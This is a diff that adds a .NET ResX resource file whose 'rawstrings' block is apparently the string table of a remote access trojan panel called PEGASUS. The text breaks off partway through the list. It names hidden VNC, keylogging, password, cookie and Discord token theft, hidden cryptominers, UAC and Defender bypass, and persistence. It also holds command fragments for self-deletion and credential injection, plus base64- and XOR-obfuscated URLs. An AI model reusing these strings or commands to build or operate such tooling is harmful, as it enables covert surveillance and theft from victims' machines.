@@ -1,0 +1,2559 @@
+<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="rawstrings">
+    <value>
+      [hVNC/hBrowsers]|060009AC|
+      [On join Tasks/Logs System]|060009AC|
+      [Password Recovery/Keylogger]|060009AC|
+      [PEGASUS]|060009AC|
+      [Persistence/Startup/Task]|060009AC|
+      [Privilige Escalation/Firewall]|060009AC|
+      [Remote Control]|060009AC|
+      [Remote Execution]|060009AC|
+      [Remote Miners]|060009AC|
+      [Reverse Proxy]|060009AC|
+      [Spam Tools]|060009AC|
+      [System Control]|060009AC|
+      Browse &amp; Execute|060009AC|
+      Clear Logs|060009AC|
+      Copy Selected|060009AC|
+      Delete|06000683,060006AC,060009AC|
+      Download &amp; Execute|060009AC|
+      Execute to Memory|060009AC|
+      Exstract &amp; Open|060006AC|
+      Fake Binder|060009AC|
+      Kill Connection|06000608|
+      Persistence  Defeat UAC|060009AC|
+      Persistence  Defeat WD|060009AC|
+      Persistence Schtask|060009AC|
+      Start|060009AC|
+      Stop|060009AC|
+      Task Keylogger|060009AC|
+      Update all clients|060009AC|
+     Change Wallpaper|060009AC|
+     Chat Room|060009AC|
+     Defeat Firewall|060009AC|
+     File Search|060009AC|
+     From Url|060009AC|
+     Keylogger|060009AC|
+     MessageBox|060009AC|
+     On/Off|060009AC|
+     Run Shellcode|060009AC|
+     Send File|060009AC|
+     Send File To Disk|060009AC|
+     Send File To Memory|060009AC|
+     Stop|060009AC|
+     UAC Exploitation|060009AC|
+     Visit Website|060009AC|
+    Block Clients|060009AC|
+    FPS:|06000BB1,06000BB7|
+    Screen:|06000BB1,06000BB7|
+    Size:|06000BB1,06000BB7|
+  Encrypted {0} strings.|06000AD7|
+  Remove|060009AC|
+  Renamed {0} methods.
+  Renamed {1} parameters.|06000AD2|
+ &amp; cmdkey /delete |06000B65|
+ &amp;&amp; timeout /t 5"|06000371|
+ / |060000EF|
+ /user:PEGASUS /pass:PEGASUS &amp; mstsc.exe /v |06000B65|
+ [Geo Location] |06000B77|
+ \ |06000811|
+ \ Discord|06000B67|
+ | |060008B7|
+ | Welcome |060007BB|
+ available, redirecting to update!|0600030C|
+ clients will be used as proxy
+Keep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works|060005F8|
+ Days |06000375|
+ disconnected.|06000239|
+ discord recovery error|06000B67|
+ discord recovery success，file located @ ClientsFolder \ |06000B67|
+ Hours Left|06000375|
+ Hvnc activated on Client |06000B63|
+ ints proxied!|06000A90|
+ Invalid!|0600013B|
+ is not found in Embedded Resources.|0600006E|
+ MB|060000EF|
+ MS|06000BAF|
+ -o |06000639|
+ opened [|06000BB3|
+ password recoveried error|06000B84|
+ password saved success，file located @ ClientsFolder/|06000B7E|
+ passwords recovered success，file located @ClientsFolder\|06000B84|
+ passwords recovered,file located @ ClientsFolder ,Pass:pegasus|06000BB5|
+ Sent to |06000238|
+ x |06000BB1,06000BB7|
+
+|06000456,060007B2,06000B67,06000B84|
+
+  Renamed {0} properties.
+  Renamed {1} fields.
+  Renamed {2} events.|06000AD2|
+
+
+  The session has ended, open program again.|060003D2|
+
+Give me a port to listen.
+
+|06000907|
+
+Payload link.
+|060008E1,06000964|
+
+Type Algorithm.
+
+|060008EB|
+
+Type Password.
+
+|060008EB|
+
+Type Pool:Port.
+
+|060008EB|
+
+Type Port (3389 rdp).
+
+|060009A5|
+
+Type Protocol tcp/http.
+
+|060009A5|
+
+Type Threads.
+
+|060008EB|
+
+Type Token.
+
+|06000992,06000998,060009A5|
+
+Type Wallet.
+
+|060008EB|
+
+Type Your Link Here.
+
+|06000B12,06000B13|
+
+|060006FF,06000700,060008D3|
+"|060004AB,060006A3,06000B77|
+" -DisableRemediation -Trace -Level 0x10|06000680|
+"
+|06000680|
+"country":|06000B77|
+#FILENAME#|0600098A|
+#FOLDER#|0600098A|
+#HHVNC#|0600098A|
+#ID#|0600098A|
+#IPDNS#|0600098A|
+#PATH#|0600098A|
+#PORT#|0600098A|
+#STARTUP#|0600098A|
+#WDEX#|0600098A|
+$1:$2:$3:$4:$5:$6|060003EB|
+$this.BackgroundImage|0600012D|
+$this.Icon|0600008F,060000E2,060000E6,060000F1,060000F5,06000103,06000123,0600012D,06000143,0600059F,060005B0,060005BA,060005C9,060005D2,060005DE,060005E7,060005F1,06000608,06000612,0600061E,06000631,0600063F,06000683,060006A1,060006A5,060006AC,060006D5,060006DF,060006F2,06000707,06000710,06000718,06000721,06000730,06000742,0600074D,06000756,0600076D,06000779,0600079C,060007A7,060007B8,060007CA,060007DD,0600080A,06000815,06000825,0600083B,0600087D,06000899,060008A1,060008AD,060008BF,060009AC,06000A39,06000B36|
+%|06000AF4,06000AF5|
+% Committed Bytes In Use|060009AC|
+% Processor Time|060009AC|
+%AlphaOmega%|06000668|
+%Anti%|06000668|
+%AntiProcess%|06000668|
+%AppData%|06000683|
+%Aspida%|06000668|
+%BSOD%|06000668|
+%Certificate%|06000668|
+%Delay%|06000668|
+%Exclude%|06000668|
+%File%|06000668|
+%Folder%|06000668|
+%Group%|06000668|
+%Hosts%|06000668|
+%Install%|06000668|
+%Key%|06000668|
+%MTX%|06000668|
+%Paste_bin%|06000668|
+%path%|06000651|
+%PEGASUSshell%|06000639|
+%Ports%|06000668|
+%Prostaths%|06000668|
+%Serversignature%|06000668|
+%stub%|06000651|
+%Temp%|06000683|
+%USB%|06000668|
+%Version%|06000668|
+&amp;sign=|06000456|
+&amp;timestamp=|06000456|
+(*.bin)|*.bin|0600096A|
+(*.exe)|*.exe|0600013B|
+(*.wav)|*.wav|060006CE|
+(*.zip)|*.zip|06000599,06000616|
+(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})|060003EB|
+({0} [\W]*) ([a-z0-9-]*)|06000332|
+(Default)|06000489|
+(ext8,ext16,ex32) type $c7,$c8,$c9|0600027F|
+(never used) type $c1|0600027F|
+(Unknown)|060004AA|
+(value not set)|060004A7|
+(zero-length binary value)|06000487,060004A7|
+*|0600064A,06000AEB,06000AEC,06000AED|
+*.dll|06000238|
+,|06000641,06000643,06000653,06000668,06000747,060007BB,060008C9,06000B77|
+, would you like to open RDP viewer ? |06000B64|
+,OU=PEGASUS,O=PEGASUS By PEGASUSSoft,L=SH,C=CN|06000458|
+.|06000423,06000584,06000585,0600066A,0600078B,06000BC1|
+..|06000076,0600079C,06000815|
+...|06000143,060007B8,06000B77|
+.7z|060003E1|
+.apk|060003E1|
+.asc|060003E1|
+.avi|060003E1|
+.b64|06000639|
+.bak|06000651|
+.bin (*.bin)|*.bin|06000639|
+.bmp|060003E1|
+.bz2|060003E1|
+.cab|060003E1|
+.cfg|060003E1|
+.compressed|06000BBE|
+.conf|060003E1|
+.ctor|06000A3A,06000AD7|
+.dll|060005AA|
+.doc|060003E1|
+.docx|060003E1|
+.exe|060003E1,0600059F,0600061E,06000666,06000683|
+.flv|060003E1|
+.gif|060003E1|
+.gz|060003E1|
+.ico|060003E1,06000667|
+.jpeg|060003E1,060007F9,06000835,06000BB7|
+.jpg|060003E1|
+.log|060003E1|
+.m3u|060003E1|
+.m4a|060003E1|
+.m4v|060003E1|
+.mkv|060003E1|
+.mov|060003E1|
+.mp3|060003E1|
+.mp4|060003E1|
+.odt|060003E1|
+.pdf|060003E1|
+.pls|060003E1|
+.png|060003E1,0600092D|
+.rar|060003E1|
+.s7z|060003E1|
+.tar|060003E1|
+.tgz|060003E1|
+.txt|060003E1,060007B2,06000B67,06000B84|
+.txt .pdf .doc|060007A7|
+.wav|060003E1|
+.wmv|060003E1|
+.zip|060003E1,06000BB5|
+.zipx|060003E1|
+.zz|060003E1|
+/|0600059F,0600061E|
+/C choice /C Y /N /D Y /T 3 &amp; Del "|060006A3|
+/c cmdkey.exe /generic:|06000B65|
+/c start cmd /C "color b &amp;&amp; title Error &amp;&amp; echo |06000371|
+/integrity.log|0600030C|
+/Password|06000B7E|
+/platform:X86 /unsafe /target:winexe|06000654|
+:|06000423,0600064A,06000927,06000928,06000B77|
+: |06000131|
+: 
+|0600076B|
+??|06000B77|
+@|06000050|
+[!] Identified end of bad bytes at offset 0x{0:X} in the original file|0600067E|
+[-] C:\Temp doesn't exist. Creating it...|0600067C|
+[-] C:\Temp\ doesn't exist. Creating it.|0600067D|
+[-] Can't access the target file|0600067C|
+[-] Empty array supplied. Something is wrong...|06000681|
+[-] The defender antispyware service is not enabled, so MpCmdRun will fail. Exiting...|0600067D|
+[+] No threat found in submitted file!|0600067C|
+[ACTIVE NOW]|060009AC|
+[CAM PRESENT]|060009AC|
+[CPU/GPU]|060009AC|
+[DNS/HOST]|060009AC|
+[GEO]|060009AC|
+[GPU RAM]|060009AC|
+[GROUP]|060009AC|
+[HWID]|060009AC|
+[INSTALLED AT]|060009AC|
+[Load Balance Info]|06000608|
+[OP SYSTEM]|060009AC|
+[Path] |06000B77|
+[PAYLOAD]|060009AC|
+[PING]|060009AC|
+[PRESENT FIREWALL]|060009AC|
+[PRIVILIGES]|060009AC|
+[USERNAME]|060009AC|
+\|06000782,06000784,0600078E|
+\BackupCertificate.zip|0600074F,06000757|
+\Client.exe|060008B8,060008CC,060008F1|
+\Configuration|06000634,06000636,060008B1,060008B7|
+\Configuration\Key.ini|06000621,06000636|
+\Configuration\LoginRememberMe.ini|06000621,06000634,060008B1,060008B7,060008B8|
+\Cookies_|06000B84|
+\HRDP|06000B64|
+\HVNC 3.0.0.2.conf|06000933|
+\IMG_|060007F9,06000835,06000BB7|
+\Information|06000B80|
+\Information.txt|06000B80|
+\Information\Information.txt|06000B80|
+\Keylogger_|060007B2|
+\Password|06000B7E|
+\Password_|06000B84,06000BB5|
+\Password_{0:MM-dd-yyyy HH;mm;ss}.txt|06000B7E|
+\PEGASUSCertificate.p12|06000149,060008B8,060008CC,060008F1|
+\PEGASUSRecovery|0600092E|
+\PEGASUSRecovery\|0600092E|
+\RDP_Login.txt|06000B64|
+\Recovery|06000B84|
+\Tokens_|06000B67|
+\tsimpouki|06000643|
+]|06000BB3|
+^.*(?=Windows)|0600007B|
+^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$|060003EE|
+_|0600092E|
+_PEGASUSRecovery.txt|0600092E|
+_Total|060009AC|
+{|06000927,06000928|
+{{ content = {0} }}|0600000C|
+{{ msgtype = {0}, text = {1} }}|06000007|
+{0:0.##} {1}|060003E0,06000601|
+{0:D3} |06000243|
+{0:x2}|060003D1|
+{0:X2} |06000244|
+{0} {1} Bit|0600007B|
+{0}:|06000137,06000684|
+{0}:{1}|06000B77,06000BB6|
+||0600030C,0600030E,06000310,06000311,06000312,06000313,06000314,06000634,060008B1,060008B8,0600092D|
+}|06000927,06000928|
+|060005E7|
+=|0600032B|
+==|0600032B|
+-=>|0600078C,06000793,06000794,06000B82,06000B99,06000B9A,06000BB7,06000BB8|
+0|06000470,0600056C,060008DB,060008DC,060008E0,060008E1,060008E2,060008E3,060008E4,060008E5,0600092E,06000B85|
+0*|06000B0C,06000B20,06000B22|
+0.0|060005AB|
+0.0.0.0|06000683|
+0.00|060005AB|
+00:00:00:00:00:00|060003EB|
+0000 MS|06000B77|
+0123456789|0600092B|
+01234567890|0600098B|
+0123456789ABCDEF|06000681|
+045C03C7FB0E76A822AB197B6663C288D9632E55B39B80296CBCD978707A7E5B3EAE1DB5D487CE9F0E448C3557079CE142F5A41B7F1F6436077D8F3FF7C311888C|0600031B|
+0x{0:x8} ({1})|06000487|
+0x{0} ({1})|060004A7|
+1|0600086E,06000B85|
+-1|0600098A,06000B85|
+1*|06000B0D,06000B21,06000B22|
+1. Install|060009AC|
+1. Windows 8/10/11|060009AC|
+1.8|06000731|
+10|06000742|
+1000|0600092E|
+1000*|06000B2E|
+1001|0600092E|
+1001*|06000B26|
+1002|0600092E|
+1002*|06000B2F|
+1003|0600092E|
+1003*|06000B31|
+1004|0600092E|
+1004*|06000B33|
+1005|0600092E|
+1005*|06000B28|
+1006|0600092E|
+1006*|06000B34|
+11|06000871,06000B85|
+11*|06000AFF|
+12*|06000B02|
+13*|06000B09|
+14*|06000AFE|
+15*|06000AFD|
+16*|06000AFC|
+17*|06000AFB|
+18*|06000AF4|
+19*|06000AF5|
+1980*|06000B11|
+2|06000873,06000B85|
+2*|06000AEB|
+2. Add User PEGASUS/PEGASUS|060009AC|
+2. Windows 8/10/11|060009AC|
+200|0600092E|
+2000|0600092E|
+2001|0600092E|
+2002|0600092E|
+2003|0600092E|
+2004|0600092E|
+2005|0600092E|
+2006|0600092E|
+201|0600092E|
+202|0600092E|
+203|0600092E|
+204|0600092E|
+205|0600092E|
+206|0600092E|
+207|0600092E|
+21*|06000B06|
+22|0600092E|
+222|0600092E|
+223|0600092E|
+23|0600092E|
+24|0600092E|
+24*|06000928,06000AF9|
+25|0600092E|
+2555|0600092E|
+2556|0600092E|
+2557|0600092E|
+256|0600092E|
+26|0600092E|
+2fVs59pGP7gKCHBT9xWtU_2cHWsqseBqouMyAKPiw1a|060005F1|
+3|0600086F,06000B85|
+3*|06000AEB|
+3. Connect|060009AC|
+3. Windows 7|060009AC|
+30*|06000B04|
+32*|06000B03|
+3306*|06000B0B|
+3307|0600092E|
+3307*|06000B0A|
+3308*|06000B18,06000B19|
+3389|060005F1,06000992,06000998|
+34e3fcc41656a40a32adab25888d91913226b579209cc8a3bc49f1b2283c573e|06000633|
+360|06000123|
+360 Browser started successfully !|0600092E|
+360 Browser successfully started with clone profile !|0600092E|
+360 Browser!|06000B36|
+4|06000870,06000B85|
+4*|06000AEC|
+4. Admin Loop Until|060009AC|
+4. Copy Profile|060009AC|
+4.2|06000633,060008AE|
+444*|06000B05|
+4447|0600096F|
+4448|0600096B,0600098B,060009AC|
+4449|06000677,060007BB,06000907|
+4875*|06000B08|
+4876*|06000B07|
+5|06000779|
+5*|06000AEC|
+5. Disable UAC|060009AC|
+54321|0600092D|
+555*|06000B0F|
+556*|06000B10|
+557*|06000B0E|
+575249eb0703078a1fc4c46be2198b9eacc9f8f480db5513ac6dca589bec15e4|06000731|
+587|060005E7|
+6*|06000AEB|
+7|06000872,06000B85|
+7*|06000AEA,06000AEE,06000AF3|
+7-Zip|0600079C|
+8*|06000AED|
+8.8.8.8|06000676|
+80|06000779|
+818916ff637d72ee4928e41df815a09dc8dbb647dfa75837b29c3256fa446158|060008AE|
+8585* |06000B12,06000B14|
+8586*|06000B17|
+8587*|06000B16|
+8589* |06000B13,06000B15|
+881|0600092E|
+882|0600092E|
+883|0600092E|
+884|0600092E|
+885|0600092E|
+886|0600092E|
+887|0600092E|
+888|0600092E|
+8889* |06000928|
+889|0600092E|
+9|0600092E|
+991|0600092E|
+991*|06000B30|
+992|0600092E|
+992*|06000B27|
+993|0600092E|
+993*|06000B29|
+994|0600092E|
+994*|06000B2A|
+995|0600092E|
+995*|06000B25|
+996|0600092E|
+996*|06000B2B|
+997|0600092E|
+997*|06000B2C|
+998|0600092E|
+998*|06000B2D|
+999|0600092E|
+999*|06000B32|
+-a|06000331|
+A|0600064A|
+A common alternate SMTP port|060005E7|
+A session has already been started, please end the previous one!|06000319|
+a=Xl3GS?GY|06000731,060008AE|
+ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz|06000317|
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789|060002DB,060003DE,06000473|
+Abort|0600009F,060000A4,060000A5,06000A19,06000A1E,06000A1F|
+aborted|0600092A|
+About|060000E2,06000730|
+ABOUT|06000730|
+About us!|060009AC|
+About Us!|060009AC|
+Accept-Encoding|06000091|
+Accept-Language|06000091|
+ad.png|060009AC|
+Add|060005B0,0600074D|
+Add a random mutex here!|06000683|
+Add IP/PORT|06000683|
+Add IP/Port to the list!|06000683|
+Add Local |06000683|
+Add Pegasus Payload to Windows exclude list!|06000683|
+Add PEGASUS Shedule Task|060009AC|
+Add PEGASUS Startup|060009AC|
+Add PEGASUS to Startup|060009AC|
+Add Port|06000683,060007CA|
+Add Static|06000683|
+Adding Proxys...|06000A8C|
+addPEGASUSSheduleTaskToolStripMenuItem|060009AC|
+addPEGASUSToStartupToolStripMenuItem|060009AC|
+addToolStripMenuItem|060005B0|
+addToolStripMenuItem1|060005B0|
+AddUser|0600098F|
+addUserPEGASUSPEGASUSToolStripMenuItem|060009AC|
+AddyList|060001C8,060001C9|
+Admin|0600075D,06000957,06000B77|
+Administrator|0600090D,06000959,0600095A,0600095F|
+adminLoopToolStripMenuItem|060009AC|
+ae.png|060009AC|
+aeroListView1|060006AC|
+af.png|060009AC|
+After press connect just open your hvnc panel !|060009AC|
+ag.png|060009AC|
+AGGRESSIVE|060009AC|
+aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2l2U1MudHh0|060007BF|
+aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2tleVNTLnR4dA==|060007BF|
+ai.png|060009AC|
+aid|0600030C,0600030E,06000310,06000311,06000312,06000313,06000314|
+al.png|060009AC|
+alert|06000103|
+Alert when process is active,put input name!|06000946|
+algo|060001A8,060001A9,060008EB,0600099F|
+All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png|06000944|
+All the DNS Queries will be executed at the remote client to reduce DNS Leaks|06000608|
+am.png|060009AC|
+An Error Has Occured When Trying To Execute HiddenURL|060000F3,06000924,06000925|
+An Error Has Occured When Trying To Update Selected Client(s)|060000E4|
+An unexpected error occurred: |060005FB|
+An unexpected socket error occurred: {0}
+
+Error Code: {1}|060005FB|
+an.png|060009AC|
+Analyzing...
+|0600067C|
+animation1.BlindCoeff|06000103,06000683,060009AC|
+animation1.MosaicCoeff|06000103,06000683,060009AC|
+animation1.MosaicShift|06000103,06000683,060009AC|
+animation1.ScaleCoeff|06000103,06000683,060009AC|
+animation1.SlideCoeff|06000103,06000683,060009AC|
+animation2.BlindCoeff|06000683,060009AC|
+animation2.MosaicCoeff|06000683,060009AC|
+animation2.MosaicShift|06000683,060009AC|
+animation2.ScaleCoeff|06000683,060009AC|
+animation2.SlideCoeff|06000683,060009AC|
+animation3.BlindCoeff|06000683,060009AC|
+animation3.MosaicCoeff|06000683,060009AC|
+animation3.MosaicShift|06000683,060009AC|
+animation3.ScaleCoeff|06000683,060009AC|
+animation3.SlideCoeff|06000683,060009AC|
+animation4.BlindCoeff|06000683,060009AC|
+animation4.MosaicCoeff|06000683,060009AC|
+animation4.MosaicShift|06000683,060009AC|
+animation4.ScaleCoeff|06000683,060009AC|
+animation4.SlideCoeff|06000683,060009AC|
+Anti debug|06000683|
+Anti_virus|06000B77|
+antire.runtime|06000BC3|
+ao.png|060009AC|
+api.auth.gg|06000319|
+api_id|0600030C,0600030E,06000310,06000311,06000312,06000313,06000314|
+api_key|0600030C,0600030E,06000310,06000311,06000312,06000313,06000314|
+AppData|0600079C|
+APPDATA|0600078A|
+aPPDATAToolStripMenuItem|0600079C|
+Application is in Developer Mode, bypassing integrity and update check!|0600030C|
+Application not found|0600035E|
+Application not setup correctly. Please watch video link found in Program.cs|0600035D|
+application/json;charset=utf-8|06000456|
+ar.png|060009AC|
+Archive password:|0600059F,0600061E|
+Are you sure ? |06000928,06000AF9|
+Are you sure you want to permanently delete this key and all of its subkeys?|0600086C|
+Are you sure you want to update selected clients?|060000E4|
+ARP Cache poisoning has been detected!|0600032F|
+as.png|060009AC|
+asdfghjklqwertyuiopmnbvcxz|06000669|
+aspnet_compiler.exe|06000143|
+Assembly|06000683|
+Assembly Options|06000683|
+Assembly Version|06000663|
+Assembly: |06000663|
+at.png|060009AC|
+Atom !|06000B36|
+Atom Browser started successfully !|0600092E|
+Atom Browser successfully started with clone profile !|0600092E|
+Attack|06000779|
+au.png|060009AC|
+audio|06000740|
+Audio Recorder|06000742|
+Audio Recorder:|06000958|
+Auto Keylogger:|060008E5|
+autologin|060001D0,060001D1|
+autoschtaskinstall|060008E2|
+autoStart_cpu|0600020E,0600020F|
+autoStart_gpu4|060001FC,060001FD|
+autoStart_gpu6|060001FA,060001FB|
+avatar_url|0600033E,0600033F,06000340,0600035B|
+aw.png|060009AC|
+Awast Browser started successfully !|0600092E|
+Awast Browser successfully started with clone profile !|0600092E|
+Awast Browser!|06000B36|
+ax.png|060009AC|
+az.png|060009AC|
+B|060003E4,06000470,06000609|
+b~~zy0%%|odegellcickf$do~%_znk~82|%zxe`oi~$rgf|0600069C,06000723,060008AF|
+b~~zy0%%aosk~b$ieg%zkdof%ZOMKUY_Y%ZOMKY_YL_FF|0600062C|
+b~~zy0%%c$cgmx$ieg%2zdm>db$zdm|06000345|
+b~~zy0%%k~b$mm%zex~kf%\X|060008BD|
+ba.png|060009AC|
+Back|0600079C|
+Back to Login|060008AD|
+backToolStripMenuItem|0600079C|
+ban|06000368|
+banned|0600030C|
+Basic|06000137,06000684|
+bb.png|060009AC|
+bd.png|060009AC|
+Be informed that we can terminate your  license if
+ we get reports or notice any ilegal activity!
+
+|06000683|
+be.png|060009AC|
+bf.png|060009AC|
+bg.png|060009AC|
+bh.png|060009AC|
+bi.png|060009AC|
+Bin|0600096A|
+Binary Value|0600087D|
+binaryValueToolStripMenuItem|0600087D|
+binaryValueToolStripMenuItem1|0600087D|
+binaryValueToolStripMenuItem2|0600087D|
+Binder!|060009AC|
+binderror|0600030C|
+Bitmap width/height are not equal to previous bitmap|06000158|
+bj.png|060009AC|
+blake|060005BA|
+blankscreen-|060006C6|
+blankscreen+|060006C5|
+Block|0600074D|
+Block Input|060006D5|
+blockInput|060006C7|
+Blue screen error if payload killed!|06000683|
+Blue Screen Error!|06000683|
+blue_screen_of_death_48px.png|06000103|
+bm.png|060009AC|
+bn.png|060009AC|
+bo.png|060009AC|
+body|0600036D|
+Body|060005E7,060008FD|
+bouncycastle.crypto|06000BC3|
+br.png|060009AC|
+Brave|06000123|
+Brave Browser!|06000B36|
+Brave successfully started !|0600092E|
+Brave successfully started with clone profile !|0600092E|
+Browse|06000143,0600059F,0600061E,0600063F|
+Browse for your custom icon!|06000683|
+Browser|06000596,06000618,06000619|
+bs.png|060009AC|
+bt.png|060009AC|
+btn360|06000123,06000B36|
+btn360.Image|06000B36|
+btnAbouthvnc|060009AC|
+btnAbouthvnc.Image|060009AC|
+btnAdd|0600074D,060007CA|
+btnAddIP|06000683,060006D5|
+btnAddPort|06000683|
+btnAssembly|06000683|
+btnAtomBrowser|06000B36|
+btnAtomBrowser.Image|06000B36|
+btnAttack|06000779|
+btnAwast|06000B36|
+btnAwast.Image|06000B36|
+btnBack|060008AD|
+btnBinder|060009AC|
+btnBinder.Image|060009AC|
+btnBrave|06000123|
+btnBuild|06000683|
+btnCancel|060006DF,06000707,06000710,06000718|
+btnChromodo|06000B36|
+btnChromodo.Image|06000B36|
+btnClone|06000683|
+btnCocCoc|06000B36|
+btnCocCoc.Image|06000B36|
+btnComodo|06000123|
+btnComodoDragon|06000B36|
+btnComodoDragon.Image|06000B36|
+btnDelete|0600074D,060007CA|
+btnEdge|06000123|
+btnEpic|06000B36|
+btnEpic.Image|06000B36|
+btnEx|06000683|
+btnExec|06000612|
+btnFirefox|06000123|
+btnIcon|06000683,06000A39|
+btnIE|06000123|
+btnKeyboard|0600080A|
+btnKillChrome|060009AC|
+btnKillChrome.Image|060009AC|
+btnLocal|06000683|
+btnLogin|060008BF|
+btnMouse|0600080A|
+btnOk|060007A7|
+btnOpera|06000123|
+btnOperaNeon|06000123,06000B36|
+btnOperaNeon.Image|06000B36|
+btnOrbitum|06000B36|
+btnOrbitum.Image|06000B36|
+btnPalemoon|06000123,06000B36|
+btnPalemoon.Image|06000B36|
+btnPowershell|06000123|
+btnRandom|06000683|
+btnRecover|060009AC|
+btnRecover.Image|060009AC|
+btnRegister|060008AD,060008BF|
+btnRemoveHvnc|060009AC|
+btnRemoveHvnc.Image|060009AC|
+btnRemoveIP|06000683|
+btnRemovePort|06000683|
+btnresetScale|060009AC|
+btnresetScale.Image|060009AC|
+btnSave|06000683,0600080A,0600083B|
+btnSend|060005D2,060005E7|
+btnShellcode|06000683|
+btnSlimjet|06000B36|
+btnSlimjet.Image|06000B36|
+btnSputnik|06000B36|
+btnSputnik.Image|06000B36|
+btnStart|060005F1,06000608,0600063F|
+btnStarthvnc|060009AC|
+btnStarthvnc.Image|060009AC|
+btnStartL|06000123|
+btnStartStopRecord|060006D5,06000742|
+btnStatic|06000683|
+btnStop|060005F1,06000608,06000779|
+btnStopHvnc|060009AC|
+btnStopHvnc.Image|060009AC|
+btnUC|06000B36|
+btnUC.Image|06000B36|
+btnUpdate|06000730|
+btnUploadExec|060009AC|
+btnUploadExec.Image|060009AC|
+btnVisitUrl|060009AC|
+btnVisitUrl.Image|060009AC|
+btnVivaldi|06000B36|
+btnVivaldi.Image|06000B36|
+btnWaterfox|06000123,06000B36|
+btnWaterfox.Image|06000B36|
+btnYandex|06000B36|
+btnYandex.Image|06000B36|
+Build|06000683|
+Build As ShellCode|06000683|
+Builder|06000683|
+BUILDER|06000683|
+Builder!|060009AC|
+Button|060007FB,060007FC|
